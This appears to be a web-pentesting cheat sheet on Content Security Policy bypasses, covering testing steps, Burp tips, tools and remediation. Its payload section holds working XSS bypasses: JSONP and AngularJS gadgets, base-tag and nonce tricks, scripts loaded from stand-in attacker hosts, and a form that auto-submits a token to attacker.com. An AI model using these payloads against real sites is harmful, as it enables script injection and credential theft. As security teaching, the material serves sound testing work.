# Content Security Policy (CSP) Bypass

## Overview
Content Security Policy (CSP) is a browser security mechanism intended to prevent XSS, data injection, and related attacks by specifying which sources of content are considered legitimate. CSP bypasses occur when a policy is misconfigured — too permissive, or when it allows sources that can themselves be leveraged to execute attacker-controlled code. Understanding CSP bypasses is essential because a vulnerable XSS entry point protected by a weak CSP may still be exploitable.

## How It Works
The server sends a `Content-Security-Policy` header (or `<meta>` tag) that instructs the browser to only execute scripts, load resources, or navigate to allowed sources. For example:
```
Content-Security-Policy: script-src 'self' 'nonce-abc123' https://cdn.trusted.com
```
Bypasses work by finding loopholes in the policy:
- Using a whitelisted CDN that serves attacker-controlled files (e.g., JSONP endpoints, AngularJS, user-uploaded files)
- Forging a matching nonce/hash via injection in the same response
- Using an open redirect on a whitelisted domain to redirect to attacker infrastructure
- Abusing `unsafe-eval`, `unsafe-inline`, `data:`, or overly broad wildcards
- Using browser-specific quirks or legacy features that circumvent the policy

## Impact
- Full bypass of XSS mitigations allowing script execution in the target origin
- Data exfiltration via CSP-allowed channels
- Rendering CSP a false sense of security (policy exists but provides no real protection)
- Chaining with other vulnerabilities (HTML injection + CSP bypass = XSS equivalent)
- DOM manipulation and credential theft despite an active CSP
- Reporting endpoint abuse if `report-uri` is exposed to injection

## Where to Look
- `Content-Security-Policy` response header — parse and analyze all directives
- `<meta http-equiv="Content-Security-Policy">` tags in the HTML
- Whitelisted CDNs or third-party domains in `script-src`
- Presence of `unsafe-inline`, `unsafe-eval`, `data:`, `blob:` in directives
- Overly broad wildcards: `*.trusted.com` (attacker may control a subdomain)
- Whitelisted domains that host JSONP endpoints, AngularJS, or user-uploadable content
- `script-src` that includes `https:` (allows any HTTPS URL)
- Missing directives (e.g., no `object-src`, no `base-uri`)
- Nonce values that appear predictable or re-used

## Testing Steps
1. Extract the CSP: `curl -s -I https://target.com | grep -i content-security-policy`.
2. Parse the CSP with CSP Evaluator: https://csp-evaluator.withgoogle.com/.
3. Check for `unsafe-inline` or `unsafe-eval` in `script-src` — direct XSS is allowed.
4. Check for `*` wildcard: any domain can serve scripts.
5. Identify all whitelisted domains and check if any host JSONP endpoints:
   ```
   https://cdn.trusted.com/api?callback=alert(1)
   ```
6. Check for AngularJS on whitelisted CDN — if angular.js is allowed, use CSTI/template injection.
7. Check for open redirects on whitelisted domains — chain with `<script src="https://trusted.com/redirect?url=https://attacker.com/evil.js">`.
8. If `base-uri` is missing, inject `<base href="https://attacker.com/">` to hijack relative script loads.
9. If `object-src` is missing or `'none'` is absent, try `<object data="javascript:...">`.
10. Test nonce bypass by checking if the nonce appears in a reflected injection point.

## Payloads / Techniques

If `unsafe-inline` is present (trivial bypass):
```javascript
<script>alert(document.domain)</script>
```

If `unsafe-eval` is present:
```javascript
eval('alert(document.domain)')
setTimeout('alert(document.domain)', 0)
setInterval('alert(1)', 1000)
new Function('alert(1)')()
```

JSONP bypass (whitelisted domain hosts JSONP endpoint):
```html
<!-- CSP allows https://apis.google.com -->
<script src="https://apis.google.com/ajax/libs/angularjs/1.6.0/angular.min.js"></script>
<script src="https://accounts.google.com/o/oauth2/revoke?token=alert(1)//"></script>
<!-- JSONP: token value is called as a function -->
```

AngularJS CSTI bypass (when AngularJS is on the whitelist):
```html
<!-- Include angular from whitelisted CDN, then use template injection -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js"></script>
<div ng-app>{{constructor.constructor('alert(document.domain)')()}}</div>
```

AngularJS sandbox bypass (older versions):
```
{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
```

Open redirect on whitelisted domain to load external script:
```html
<!-- If trusted.com has open redirect at /redir?url=X -->
<script src="https://trusted.com/redir?url=https://attacker.com/evil.js"></script>
```

Nonce bypass — if nonce is reflected in the page alongside injection:
```html
<!-- Find the nonce value in the CSP header: nonce-r4nd0m -->
<!-- If the nonce is also reflected somewhere in the page that you can inject near: -->
<script nonce="r4nd0m">alert(document.domain)</script>
```

`base-uri` missing — base tag injection:
```html
<!-- Missing "base-uri 'none'" in CSP -->
<base href="https://attacker.com/">
<!-- Now all relative script/image/link loads go to attacker.com -->
```

`object-src` missing or not `'none'`:
```html
<object data="javascript:alert(1)"></object>
<object type="text/x-scriptlet" data="https://attacker.com/evil.sct"></object>
```

`data:` URI in script-src:
```html
<script src="data:text/javascript,alert(document.domain)"></script>
```

Wildcard subdomain — attacker controls a subdomain:
```
CSP: script-src *.trusted.com
Attacker registers: evil.trusted.com (or finds XSS on any subdomain)
<script src="https://evil.trusted.com/payload.js"></script>
```

`https:` wildcard bypass:
```
CSP: script-src https:
<!-- Allows any HTTPS URL -->
<script src="https://attacker.com/evil.js"></script>
```

Form action bypass (if form-action is missing):
```html
<form action="https://attacker.com/capture" method="POST">
  <input name="token" value="STOLEN_TOKEN">
  <input type="submit">
</form>
<script>document.forms[0].submit()</script>
```

Bypass via stylesheet + CSS exfiltration when script-src is strict but style-src is loose:
```html
<link rel="stylesheet" href="https://attacker.com/steal.css">
```

## Burp Suite Tips
- Use the **CSP Auditor** extension to automatically parse and highlight weak CSP configurations.
- In **Repeater**, read the `Content-Security-Policy` header from each response to identify policy variations across different pages.
- Use **Burp's browser** (embedded Chromium) to test CSP bypasses — the browser enforces CSP, so you can confirm if a bypass actually works in real time.
- The **CSP Bypass** section in DOM Invader can suggest bypass techniques based on the detected policy.
- Check for CSP report endpoints (`report-uri` / `report-to`) — if exposed to injection you may be able to spoof reports or cause information leakage.
- Search response history for `Content-Security-Policy` and compare policies across pages — some pages may have weaker policies than others.

## Tools
- CSP Evaluator — https://csp-evaluator.withgoogle.com/ (Google's CSP analysis tool)
- csp-bypass.com — lists known JSONP and AngularJS bypass endpoints per CDN
- Burp Suite CSP Auditor extension
- retire.js — identifies vulnerable JS libraries on whitelisted CDNs
- securityheaders.com — quick CSP grade and analysis
- bypass-csp (GitHub) — collection of known JSONP endpoints for CSP bypass
- trufflesecurity/csp-evaluator — CLI version for automated pipeline checks

## Remediation
- Use a strict allowlist: `script-src 'nonce-{random}' 'strict-dynamic'` — this is the most secure modern approach.
- Rotate nonces on every page load using a cryptographically secure random value (at least 128 bits).
- Never use `unsafe-inline` or `unsafe-eval` — they negate most CSP protections.
- Set `base-uri 'none'` or `base-uri 'self'` to prevent base tag injection.
- Set `object-src 'none'` to block plugin-based execution.
- Avoid whitelisting CDN domains unless absolutely necessary; if needed, pin to specific file hashes with `'sha256-...'`.
- Use `'strict-dynamic'` to allow trusted scripts to load further scripts dynamically.
- Implement `default-src 'none'` and explicitly whitelist only what is needed.
- Test CSP with the browser's console — policy violations appear there.
- Use `Content-Security-Policy-Report-Only` during development to collect violation reports without enforcement.

## References
https://portswigger.net/web-security/cross-site-scripting/content-security-policy
https://portswigger.net/research/bypassing-csp-with-policy-injection
https://csp-evaluator.withgoogle.com/
https://owasp.org/www-community/controls/Content_Security_Policy
https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html
https://github.com/bhaveshk90/Content-Security-Policy-CSP-Bypass-Techniques
https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass
